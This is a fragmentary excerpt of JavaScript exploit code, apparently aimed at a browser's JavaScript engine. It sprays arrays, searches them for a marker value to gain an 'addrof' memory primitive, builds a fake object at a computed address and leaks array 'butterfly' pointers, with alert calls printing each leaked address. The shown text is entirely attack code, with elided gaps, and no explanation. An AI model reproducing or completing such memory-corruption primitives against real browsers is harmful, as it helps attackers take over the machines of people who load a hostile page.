...
for (var i = 1; i < SPRAY1; i += 3) {
    if (spray[i] !== null && spray[i][0] !== 13.37) {
        alert("YES! addrof(obj) =", hex(f2i(spray[i][0])))
        unboxed1 = spray[i]
        boxed1 = spray[i+1]
        break
    }
...
alert('leaking from: '+ hex(leak_addr))
...
alert(hex(stage1.addrof(outer)))
var fake_addr = stage1.addrof(outer) + 0x10
alert('fake obj @ ' + hex(fake_addr))
...
alert('unboxed butterfly =', hex(shared_butterfly))
var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
alert('boxed butterfly =', hex(f2i(boxed_butterfly)))
